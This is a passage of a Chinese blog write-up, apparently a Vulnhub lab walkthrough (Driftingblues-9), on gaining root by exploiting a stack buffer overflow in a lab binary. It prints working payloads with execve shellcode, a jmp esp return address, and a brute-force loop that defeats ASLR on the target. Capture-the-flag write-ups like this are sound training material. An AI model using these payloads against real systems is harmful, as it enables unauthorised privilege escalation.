-<p><img src="/2022/06/06/Driftingblues-9/16.png" alt="image-"></p>
-<p>3.我们将input文件获取到本地，用checksec查看，该文件并没有启用任何保护措施：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 8001，clapton开启http服务（尝试使用了python3 -m http.server 8001，发现靶机没有python3）</span><br><span class="line">wget http://192.168.56.120:8001/input，kali获取input</span><br><span class="line">checksec --file=input</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-9/17.png" alt="image-"></p>
-<p>4.使用命令修改input文件所有者，并赋予程序特殊权限：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo chown 0:0 input</span><br><span class="line">sudo chmod 4755 input</span><br><span class="line">ls -l</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-9/18.png" alt="image-"></p>
-<p>5.使用cyclic生成500个字符组成的字符串用于计算偏移量：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3</span><br><span class="line">from pwn import *</span><br><span class="line">cyclic(500)</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-9/19.png" alt="image-"></p>
-<p>6.然后关闭kali的ASLR，启动gdb调试input程序，将500个字符组成的字符串传入程序并运行后程序奔溃，EIP寄存器的值为“0x61617362”：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo sh -c &quot;echo 0 &gt; /proc/sys/kernel/randomize_va_space&quot;</span><br><span class="line">gdb input</span><br><span class="line"></span><br><span class="line">r aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaae</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-9/20.png" alt="image-"></p>
-<p>7.再次利用cyclic计算偏移量得到171，那么payload构造为“171个A”+“jmp esp地址”+Shellcode：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyclic_find(0x61617362)</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-9/21.png" alt="image-"></p>
-<p>8.在kali使用edb-debugger，随便传入参数调试程序，运行程序后Ctrl+O寻找jmp esp指令地址：</p>
-<p><img src="/2022/06/06/Driftingblues-9/22.png" alt="image-"></p>
-<p><img src="/2022/06/06/Driftingblues-9/23.png" alt="image-"></p>
-<p>9.选择r-x权限下的第一个jmp esp地址，写入payload，在kali上可以成功获得root权限：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./input `python -c &quot;print &#x27;A&#x27;*171+&#x27;\x70\xbe\xe0\xf7&#x27;+&#x27;\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80&#x27;&quot;`</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-9/24.png" alt="image-"></p>
-<p>10.但同样的payload在clapton用户上并不能起效，原因是靶机开启了ASLR而我们无权限关闭，且靶机的偏移地址是jmp esp相对libc基址的偏移地址，kali下的libc.so.6文件与靶机不同；所以这里我们采用循环绕过ASLR:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb ./input，在clapton上测定偏移地址</span><br><span class="line">run $(python -c &#x27;print &quot;A&quot; * 171 + &quot;B&quot; * 5 + &quot;\x90&quot; * 2000&#x27;)，在kali上我们已经测得程序溢出位置偏移量为171，clapton上也如此</span><br><span class="line">x/s $esp，得到jmp esp相对libc基址的偏移地址</span><br><span class="line">q y，退出gdb调试</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-9/25.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in &#123;1..10000&#125;; do (./input $(python -c &#x27;print &quot;A&quot; * 171 + &quot;\xe0\xd6\x9e\xbf&quot; + &quot;\x90&quot; * 2000 + &quot;\x31\xc9\xf7\xe1\x51\xbf\xd0\xd0\x8c\x97\xbe\xd0\x9d\x96\x91\xf7\xd7\xf7\xd6\x57\x56\x89\xe3\xb0\x0b\xcd\x80&quot;&#x27;)); done，循环绕过ASLR</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-9/26.png" alt="image-"></p>
-</blockquote>
-<h3><span id="flag获取">Flag获取</span></h3><blockquote>
-<p>1.通过利用缓冲区溢出漏洞，我们成功提权到root，在&#x2F;root目录下能够找到flag，即root.txt：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line">ls -la</span><br><span class="line">cat root.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-9/27.png" alt="image-"></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Driftingblues/" rel="tag">Driftingblues</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
             </div>
         
 
